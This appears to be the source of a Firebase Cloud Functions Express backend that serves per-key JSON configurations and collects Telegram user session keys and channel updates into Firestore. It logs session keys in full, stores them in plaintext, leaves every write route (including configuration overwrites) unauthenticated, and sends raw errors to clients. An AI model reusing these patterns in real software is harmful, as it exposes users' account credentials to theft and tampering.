const functions = require('firebase-functions');
const admin = require( 'firebase-admin' )
const express = require( 'express' )
const pug = require('pug')

admin.initializeApp( functions.config().firebase )

const db = admin.firestore()
const app = express()

const collection_configurations_per_api_key = db.collection( 'configurations_per_api_key' )

app.get( '/', ( req, res ) => res.redirect('/api?api_key=generic') )

app.get( '/api', ( req, res ) => {
  res.setHeader( 'Content-Type', 'application/json' );
  let api_key = req.query['api_key']
  if (!api_key) api_key = "generic"
  let collection = collection_configurations_per_api_key
  let ref_base = collection.doc( '_base' )
  let ref_overrides = collection.doc( api_key )
  ref_base.get().then( doc_base => {
    ref_overrides.get().then( doc_overrides => {
      let data_base = JSON.parse( doc_base.data().json )
      let data_overrides = JSON.parse( doc_overrides.data().json )
      return res.send( Object.assign( data_base, data_overrides ) ) 
    } ).catch( e => res.send( e ) )
  } ).catch( e => res.send( e ) )
} )

app.put( '/api/telegramUsers/:user_id', ( req, res ) => {
  res.setHeader( 'Content-Type', 'application/json' );
  let user_id = req.params["user_id"]
  console.log(req.body)
  let session_key = req.body["session_key"]
  console.log(`New session key received for user ${user_id}:\n${session_key}`)
  
  let ref = db.collection( 'session_keys' ).add( { user_id : user_id, value : session_key } )
     .then( o => res.send( 'ok' ) )
     .catch( e => res.send( e ) )
} )

app.put( '/api/telegramChannels/:api_channel_id', ( req, res ) => {
  res.setHeader( 'Content-Type', 'application/json' );
  let api_channel_id = req.params["api_channel_id"]
  let data = req.body
  console.log(`New data received for channel ${api_channel_id}:\n${data}`)
  
  let ref = db.collection( 'channel_updates' ).add( req.body )
     .then( o => res.send( 'ok' ) )
     .catch( e => res.send( e ) )
} )

app.get( '/api/telegramUsers/:user_id/requestVerificationCode', ( req, res ) => {
  res.setHeader( 'Content-Type', 'application/json' );
  console.log(`User ${req.params['user_id']} submitted a request for verification code.`)
  return res.send( "{}" )
} )

app.get( '/api/telegramUsers/:user_id/getVerificationCode', ( req, res ) => {
  res.setHeader( 'Content-Type', 'application/json' );
  console.log(`User ${req.params['user_id']} checked for verification code.`)
  return res.send( "{}" )
} )

///

function echo_jsonedit( req, res ) 
{
  let api_key = req.params['api_key']
  let ref = collection_configurations_per_api_key.doc( api_key )
  ref.get().then( doc => {
    let json = !doc.exists ? "{}" : doc.data().json
    let data = { json: json, doc : api_key }
    let html = pug.renderFile( 'jsonedit.pug', data )
    return res.send( html ) 
  } ).catch( e => res.send( e ) )
}

app.get( '/jsonedit/:api_key', echo_jsonedit )
app.get( '/jsonedit', (req,res) => { req.params = req.query; return echo_jsonedit(req,res); } )

app.post( '/set/:api_key', ( req, res ) => {
  let api_key = req.params['api_key']
  let ref = collection_configurations_per_api_key.doc( api_key )
  let json = req.body
  ref.set( { json: json } )
     .then( o => res.send( 'ok' ) )
     .catch( e => res.send( e ) )
} )

///

exports.app = functions.https.onRequest( app )
